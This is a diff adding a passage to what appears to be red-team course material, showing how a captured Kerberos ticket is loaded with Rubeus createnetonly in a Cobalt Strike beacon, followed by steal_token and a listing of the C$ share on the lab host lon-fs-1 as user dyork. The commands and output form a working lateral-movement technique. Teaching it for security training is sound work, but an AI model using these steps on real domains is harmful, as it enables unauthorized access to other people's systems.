@@ -223,3 +223,40 @@ Where:
 
       doIGL[...snip...]mcy0x
 ```
+
+This ticket can be used to access the CIFS service on _lon-fs-1_ as _dyork_.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIGL[...snip...]mcy0x
+
+[*] Using CONTOSO.COM\dyork:FakePass
+
+[*] Showing process : False
+[*] Username        : dyork
+[*] Domain          : CONTOSO.COM
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2080
+[+] Ticket successfully imported!
+[+] LUID            : 0xa1c99b
+
+beacon> steal_token 2080
+beacon> ls \\lon-fs-1\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/23/2025 15:44:52   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     02/20/2025 10:37:21   Files
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     01/23/2025 15:46:17   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     01/24/2025 14:21:18   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     01/24/2025 14:18:02   System Volume Information
+          dir     01/24/2025 14:17:49   Users
+          dir     01/24/2025 13:34:02   Windows
+ 12kb     fil     02/20/2025 10:50:16   DumpStack.log.tmp
+ 1gb      fil     02/20/2025 10:50:16   pagefile.sys
+```
